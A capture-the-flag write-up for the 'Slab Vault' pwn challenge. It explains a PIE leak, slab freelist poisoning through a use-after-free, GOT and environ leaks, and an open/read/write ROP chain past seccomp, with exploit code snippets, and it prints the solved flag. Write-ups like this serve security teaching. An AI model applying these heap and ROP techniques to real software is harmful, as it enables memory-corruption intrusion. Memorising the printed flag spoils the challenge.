# Slab Vault - CTF Writeup

**Challenge:** The Slab Vault (BCS CTF, Hard, 200 pts, 55 solves)
**Flag:** `bcsctf{sl4b_fr33l1st_p01s0n_2_0rw_s3cc0mp_f448c9}`
**Target:** `nc 172.16.38.22 1337`

## 1. Challenge Overview

The challenge presents a "vault" application with five menu options built on top of a custom slab allocator. The description warns:

> "Welcome to the Slab Vault - a military-grade memory isolation system built with a high-performance custom slab allocator and fortified with kernel-level Seccomp filters. Our security audit guarantees that no shells can ever be spawned here. Can you bypass the vault defenses and inspect the classified records?"

The goal is to read `/flag` while bypassing a strict seccomp filter that blocks shell execution.

## 2. Binary Analysis

### 2.1 Security Mitigations

```
RELRO:    Full RELRO      -> GOT read-only after relocation
STACK:    Canary found    -> Stack smashing protected
NX:       Enabled         -> Non-executable memory
PIE:      Enabled         -> Position-independent code
SHSTK:    Enabled         -> Shadow stack (CET)
IBT:      Enabled         -> Indirect branch tracking (CET)
FORTIFY:  Yes (2)
```

### 2.2 Menu Operations

| # | Operation | Behavior |
|---|-----------|----------|
| 1 | Create    | Allocates slab chunk, stores 12-byte title, **does NOT read data** |
| 2 | Edit      | Reads data into slab chunk |
| 3 | View      | `puts(title)` + `callback(title)` + `write(1, data, size)` |
| 4 | Delete    | Frees slab chunk, clears vault entry |
| 5 | Clone     | **Shallow copy** of vault entry (including data_ptr) |

### 2.3 Vault Entry Struct (40 bytes)

Located at `PIE + 0x5060`, with 16 entries total:

```
offset  size  type   description
+0x00   4     dword  active flag (1=active, 0=inactive)
+0x04   12    bytes  title (up to 12 bytes)
+0x10   8     qword  callback function pointer (log_helper)
+0x18   8     qword  user size
+0x20   8     qword  data_ptr (slab chunk data pointer)
```

### 2.4 Custom Slab Allocator

- **Layout:** 0x40000 bytes mmap'd as private anonymous memory
- **Free list bins:** 3 bins for sizes 0x40, 0x80, 0x100
- **Chunk structure** (8-byte header before returned pointer):
  ```
  [+0] "BALS"   (4-byte magic = 0x534C4142)
  [+4] user_size (2 bytes)
  [+6] slab_size (2 bytes)
  [+8] user data (this is what slab_alloc returns)
  ```
- **Freelist link:** Stored at `data[0..7]` (i.e., `chunk+8`); bins[i] stores the chunk's start address (`data-8`)

### 2.5 Seccomp BPF Filter

Decoded from the binary's `prctl` setup, the filter allows only:
- `read`, `write`, `open`, `openat`, `close`, `fstat`, `newfstatat`, `lseek`
- `mmap`, `brk`, `exit`, `exit_group`

**Blocked:** `execve`, `execveat`, all process/thread creation, all socket syscalls, `ioctl`, `ptrace`, etc.

This means we **cannot get a shell** — we must read `/flag` directly with `open`+`read`+`write` syscalls via ROP.

## 3. Vulnerability Analysis

### 3.1 Vulnerability #1: puts() Buffer Overflow (PIE Leak)

In the `view_vault` function, the title is printed with `puts()`:

```c
puts(vault[i].title);  // title is at entry+0x04, only 12 bytes
```

The title buffer is 12 bytes but `puts()` reads until it hits a null byte. The **callback pointer** at `entry+0x10` immediately follows the title in memory. Since `callback = log_helper = PIE + 0x1720`, when the title has no embedded null bytes, `puts()` overflows past the title and leaks 6 bytes of the callback address.

This gives us a full **PIE base leak** since `PIE + 0x1720` allows recovering `PIE` itself.

### 3.2 Vulnerability #2: Use-After-Free via Clone+Delete+Edit (Slab Freelist Poisoning)

The `clone_vault` operation performs a **shallow copy** of the vault entry, including `data_ptr`. After cloning:

1. `Create vault A` — allocates chunk C1
2. `Clone A → B` — both A and B point to C1's data
3. `Delete A` — C1 is freed, returned to the freelist
4. `Edit B` — writes to C1's data area, which is now in the freelist!

The freelist next pointer is stored at `data[0..7]` (chunk+8). When we Edit B, we control the next pointer of the freed chunk.

After this:
- The next `Create` pops the corrupted chunk C1 from the freelist
- `bins[bin]` becomes our controlled pointer
- The *following* `Create` pops from our controlled pointer, giving us an **arbitrary allocation primitive**

### 3.3 Vulnerability #3: Forged Vault Entries (Arbitrary R/W)

By pointing the freelist at `PIE + 0x5060` (the vault array), the next allocation returns a pointer overlapping the vault array. We can then forge any vault entry to have:
- Any `data_ptr` we want
- Any `size` we want
- Any `callback` we want

This gives us **arbitrary read** (via `View`) and **arbitrary write** (via `Edit`) of any address in the process.

## 4. Exploitation

### 4.1 Stage 1: PIE Leak

```python
# Create vault 0 with full 12-byte title (no nulls)
create(0, 0x40, b'A' * 12)

# View vault 0 — puts(title) overflows into callback
title, _, _ = view(0)

# Extract leaked bytes (after the 12 A's)
leaked = title[12:]   # 6 bytes of log_helper address
pie = u64(leaked.ljust(8, b'\x00')) - LOG_HELPER
```

### 4.2 Stage 2: Arbitrary Read/Write Primitive

```python
# Target: PIE + 0x5060 (vault array)
target = pie + VAULT  # 0x5060

# Step 1: Set up UAF
clone(0, 1)                    # B shares chunk with A
delete(0)                      # Free chunk via A; B still references it
edit(1, p64(target - 8))       # Write forged next pointer into freed chunk

# Step 2: Pop the freed chunk, then pop from target
create(2, 0x40, b'B')         # Pops the freed chunk, bins[bin] = target-8... wait
create(3, 0x40, b'C')         # Pops from target (vault array)
```

After stage 2, vault slot 3's `data_ptr` overlaps with `vault[4]`. Editing slot 3 overwrites vault[4]'s fields (active, title, callback, size, data_ptr).

### 4.3 Stage 3: Libc Leak

```python
# Forge vault[4] to point data_ptr at puts@got
forged_entry = flat(
    p32(1),           # active
    b'R' * 8 + b'\x00' * 4,  # title
    p64(0),           # callback (NULL so it isn't called)
    p64(8),           # size
    p64(pie + elf.got['puts']),  # data_ptr → puts@GOT
)
edit(3, forged_entry)

# View vault[4] — leaks puts@libc
puts_libc = u64(view(4)[2][:8])
libc_base = puts_libc - libc.symbols['puts']
```

### 4.4 Stage 4: Stack Leak

With arbitrary read, leak libc's `environ` symbol to get a stack address:

```python
environ = u64(read_mem(libc_base + libc.symbols['environ'], 8))
```

### 4.5 Stage 5: Locate Saved RIP

The `view_vault` and `edit_vault` functions both save the return address to main on the stack. From analysis, this saved RIP is consistently at `environ - 0x278` (or `environ - 0x280` in some runs).

```python
# Read 8 bytes at environ - 0x278
candidate = environ - 0x278
value = read_mem(candidate, 8)
# Should equal pie + 0x15D5 (return to main after view)
```

### 4.6 Stage 6: ROP Chain to Read /flag

The ROP chain uses libc gadgets to perform `open + read + write`:

```python
pop_rdi     = libc_base + 0x2A3E5
pop_rsi     = libc_base + 0x2BE51
pop_rdx_rbx = libc_base + 0x90469
ret         = libc_base + 0x29CD6

flag_path_addr = saved_rip + 0x180  # Will store "/flag\0" string
buf_addr       = saved_rip + 0x300  # Read buffer

rop = flat(
    ret,                            # Stack alignment
    pop_rdi, flag_path_addr,
    pop_rsi, 0,
    libc_base + libc.symbols['open'],    # fd = open("/flag", 0)
    pop_rdi, 3,                          # fd = 3
    pop_rsi, buf_addr,
    pop_rdx_rbx, 0x100, 0,
    libc_base + libc.symbols['read'],    # read(3, buf, 0x100)
    pop_rdi, 1,                          # fd = 1 (stdout)
    pop_rsi, buf_addr,
    pop_rdx_rbx, 0x100, 0,
    libc_base + libc.symbols['write'],   # write(1, buf, 0x100)
    pop_rdi, 0,
    libc_base + libc.symbols['exit'],
)
rop = rop.ljust(0x180, b'\x00') + b'/flag\x00'

# Overwrite the saved RIP
write_mem(saved_rip, rop)

# When view_vault returns, it pops our ROP chain
```

The ROP chain works because the seccomp filter **does allow** the `open`, `read`, and `write` syscalls — it only blocks shell execution.

## 5. Final Exploit Code

The complete exploit is in `exploit.py`. To run:

```bash
# Local testing (with bundled libc + ld)
python3 exploit.py

# Remote
python3 exploit.py REMOTE
```

## 6. Key Takeaways

1. **`puts()` on a fixed-size buffer is dangerous** when adjacent memory contains non-null data. Always null-terminate or use bounded `write()`.

2. **Shallow copies of pointers create UAFs.** When two owners point to the same allocation, freeing one doesn't update the other.

3. **Freelist metadata is just data.** If you can write to a freed chunk's data area, you control the freelist. This applies to any custom allocator that doesn't protect freelist links.

4. **Seccomp filters often have gaps.** Even when "no shells allowed" is the policy, the filter usually allows enough syscalls to read files directly. ROP with open+read+write is the standard fallback.

5. **Full RELRO doesn't prevent GOT leaks** — the GOT is still readable. Leaking libc via GOT remains a viable technique.

## 7. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────┐
│ Stage 1: PIE Leak                                          │
│   puts(title) overflows into callback → leak PIE base       │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ Stage 2: Slab Freelist Poisoning                           │
│   clone + delete + edit → set next ptr to vault array       │
│   create twice → arbitrary alloc overlapping vault array    │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ Stage 3: Libc Leak via GOT                                 │
│   Forge vault entry → data_ptr = puts@got                  │
│   View → leak puts@libc → compute libc base                │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ Stage 4: Stack Leak via libc.environ                       │
│   Read environ symbol → get a stack pointer                │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ Stage 5: Locate Saved RIP                                  │
│   Search stack for return address into main                │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ Stage 6: ROP to read /flag                                 │
│   Overwrite saved RIP with:                                │
│     open("/flag", 0) → read(3, buf, 0x100) → write(1, ...) │
│   When view returns, ROP executes and prints the flag       │
└─────────────────────────────────────────────────────────────┘
```

The flag's name `sl4b_fr33l1st_p01s0n_2_0rw_s3cc0mp` directly references the technique: **slab freelist poisoning to overwrite, then bypass seccomp**.
